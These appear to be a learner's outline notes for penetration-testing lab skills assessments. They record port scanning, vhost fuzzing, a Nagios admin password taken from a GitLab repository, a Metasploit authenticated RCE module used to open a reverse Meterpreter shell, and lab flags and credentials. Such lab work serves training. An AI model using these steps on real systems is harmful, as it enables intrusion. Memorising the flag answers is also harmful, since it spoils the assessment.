        - run
          - Meterpreter 1>
            - cat /users/administrator/desktop/flag.txt
              - f55763d31a8f63ec935abd07aee5d3d0
### Skills Assessment II

- What is the URL of the WordPress instance?
  - nmap -p- -sC gitlab.inlanefreight.local
    - 22/tcp   open  ssh  
      | ssh-hostkey:  
      |   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)  
      |   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)  
      |_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)  
      25/tcp   open  smtp  
      |_smtp-commands: skills2, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING  
      80/tcp   open  http  
      |_http-title: Did not follow redirect to http://gitlab.inlanefreight.local:8180/  
      389/tcp  open  ldap  
      443/tcp  open  https  
      | ssl-cert: Subject: commonName=10.129.201.90/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US  
      | Not valid before: 2021-09-02T01:49:48  
      |_Not valid after:  2031-08-31T01:49:48  
      | tls-alpn:  
      |_  http/1.1  
      |_ssl-date: TLS randomness does not represent time  
      |_http-title:  Shipter\xE2\x80\x93Transport and Logistics HTML5 Template  
      5667/tcp open  unknown  
      8060/tcp open  aero  
      8180/tcp open  unknown  
      | http-title: Sign in \xC2\xB7 GitLab  
      |_Requested resource was http://gitlab.inlanefreight.local:8180/users/sign_in  
      | http-robots.txt: 54 disallowed entries (15 shown)  
      | / /autocomplete/users /autocomplete/projects /search  
      | /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/  
      |_/*/new /*/edit /*/raw  
      9094/tcp open  unknown
  - visit https 443
    - Shifter (wordpress theme)
  - ffuf -u http://10.129.201.90 -H "Host: FUZZ.inlanefreight.local"  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -fs 46166
    - blog  
      monitoring  
      gitlab
      - http://blog.inlanefreight.local/
- What is the name of the public GitLab project?
  - gitlab.inlanefreight.local:8180
    - register ? Explore Projects ? Virtualhost (project
      - Virtualhost 🌐
- What is the FQDN of the third vhost?
  - monitoring.inlanefreight.local
    - saw it in Virtualhost project in gitlab
- What application is running on this third vhost? (One word)
  - Nagios
- What is the admin password to access this application?
  - look in Nagios project in gitlab
    - Name 	Last commit 	Last update  
      .gitignore 	Ignoring backup files 	17 years ago  
      INSTALL 	Update INSTALL with master password 	4 years ago  
      README 	Make README a bit more legible 	19 years ago  
      check_pg_connections.pl 	Trapping execute error for curr_conn and reporting that error. 	17 years ago  
      check_pg_lock_status.pl 	Initial Checkin of Code. 	19 years ago  
      check_pg_max_xid.pl 	Initial Checkin of Code. 	19 years ago  
      check_pg_queries.pl 	Added an INSTALL file since there were a number of assumptions I was making about the system. 	19 years ago  
      check_pg_time.pl 	Initial Checkin of Code. 	19 years ago  
      check_pg_waiting_queries.pl 	clean up some perl warnings, still not 100% though 	19 years ago  
      pg_stat_activity.sql 	Added an INSTALL file since there were a number of assumptions I was making about the system. 	19 years ago
      - click on INSTALL
        - postgres=# CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&^lC';  
          CREATE USER
          - login in http://monitoring.inlanefreight.local/ with nagiosadmin:oilaKglm7M09@CPL&^lC
            - NSP: Sorry Dave, I can't let you do that
- Obtain reverse shell access on the target and submit the contents of the flag.txt file.
  - after login check the Version number in footer
    - Nagios XI 5.7.5
  - MSF>
    - search Nagios XI 5.7.5
      - use linux/http/nagios_xi_configwizards_authenticated_rce
        - Subtopic 1
        - set password oilaKglm7M09@CPL&^lC
        - set vhost monitoring.inlanefreight.local
        - set rhosts 10.129.1.19
        - set lhost 10.10.14.2
        - show targets
          - 0   Linux (x86)  
            1   Linux (x64)  
            =>  2   CMD
            - set target 1
        - run
          - Meterpreter (/usr/local/nagiosxi/html/config)>
            - cd ../admin
              - cat f5088a862528cbb16b4e253f1809882c_flag.txt
                - afe377683dce373ec2bf7eaf1e0107eb
### Skills Assessment III

- What is the hardcoded password for the database connection in the MultimasterAPI.dll file?
  - RDP to target with username "Administrator" and password "xcyj8izxNVzhf4z"
    - xfreerdp /u:Administrator /p:xcyj8izxNVzhf4z /v:10.129.95.200
    - Get-ChildItem -Path C:\ -Filter "MultimasterAPI.dll" -Recurse -ErrorAction SilentlyContinue
      - C:\inetpub\wwwroot\bin
    - /TOOLS
      - only dnsspy
        - open it
          - invistigate under MultimasterAPI.dll
            - password=D3veL0pM3nT!
